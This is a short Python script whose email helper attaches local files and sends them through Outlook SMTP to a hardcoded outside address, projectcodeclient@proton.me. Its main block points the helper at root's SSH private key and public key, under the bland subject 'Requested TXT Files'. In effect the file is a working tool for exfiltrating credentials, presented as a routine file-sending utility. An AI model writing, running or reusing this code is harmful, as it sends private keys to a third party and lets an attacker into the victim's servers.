import os
import smtplib
from email.message import EmailMessage

def send_files_as_txt_via_email(email_address, password, file_paths, enableDebug=False):
    msg = EmailMessage()
    msg['Subject'] = 'Requested TXT Files'
    msg['From'] = email_address
    msg['To'] = 'projectcodeclient@proton.me'
    msg.set_content('Please find the requested files attached as .txt.')

    for file_path in file_paths:
        if not os.path.isfile(file_path):
            if enableDebug:
                print(f"[DEBUG] File not found: {file_path}")
            continue
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(file_path)
                msg.add_attachment(file_data, maintype='text', subtype='plain', filename=file_name)
                if enableDebug:
                    print(f"[DEBUG] Attached file: {file_name}")
        except Exception as e:
            if enableDebug:
                print(f"[ERROR] Failed to attach {file_path}: {e}")

    try:
        server = smtplib.SMTP('smtp-mail.outlook.com', 587)
        server.starttls()
        server.login(email_address, password)
        server.send_message(msg)
        server.quit()
        print("Files sent successfully.")
    except Exception as e:
        print("[ERROR] Failed to send email:", str(e))


# Main
if __name__ == "__main__":
    email_address = 'testsingtest@outlook.com'
    password = ''
    files_to_send = [
        '/home/root/.ssh/id_rsa.pub',
        '/home/root/.ssh/id_rsa'
    ]
    send_files_as_txt_via_email(email_address, password, files_to_send, enableDebug=True)
